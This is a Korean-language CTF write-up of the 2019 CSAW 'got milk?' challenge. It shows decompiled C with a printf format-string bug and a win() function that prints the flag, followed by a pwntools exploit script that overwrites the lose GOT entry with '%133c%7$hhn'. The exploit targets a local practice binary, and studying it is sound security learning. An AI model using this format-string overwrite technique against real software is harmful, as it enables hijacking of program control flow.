---
title: "2019 CSAW CTF got milk?"
date: 2020-1-23
tags: [CSAW]
categories: [CSAW]
---

바이너리랑 따로 커스텀 라이브러리 파일을 준다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char input[100]; // [esp+0h] [ebp-6Ch]
  int *v5; // [esp+64h] [ebp-8h]

  v5 = &argc;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  puts("Simulating loss...");
  lose();
  printf("Hey you! GOT milk? ");
  fgets(input, 100, stdin);
  printf("Your answer: ");
  printf(input);
  lose();
  return 0;
}c
```

`libmylib.so` 의 win함수를 보면 flag.txt를 불러오는데 win함수 호출하면 된다.

```c
void win()
{
  int c; // [esp+8h] [ebp-10h]
  FILE *file; // [esp+Ch] [ebp-Ch]

  file = fopen("flag.txt", (const char *)&unk_2000);
  if ( file )
  {
    while ( 1 )
    {
      c = getc(file);
      if ( c == -1 )
        break;
      putchar(c);
    }
    fclose(file);
  }
}
```

FSB취약점이 터진다. 오프셋은 7이다. win과 lose의 하위 바이트는 실행할 때마다 일정하므로 lose함수를 win함수로 overwrite해주면 된다.

> exploit.py

```python
from pwn import *

e = ELF('./gotmilk')
libc = ELF('./libmylib.so')
p = process('./gotmilk')
win = libc.symbols['win']
lose = e.got['lose']

# $1 = {void (void)} 0xf7fd1189 <win>
# $2 = {void (void)} 0xf7fd11f8 <lose>
# lose overwrite 0xf8 -> 0x89

payload = p32(lose) + '%133c%7$hhn'

p.sendlineafter('?',payload)

p.interactive()
```

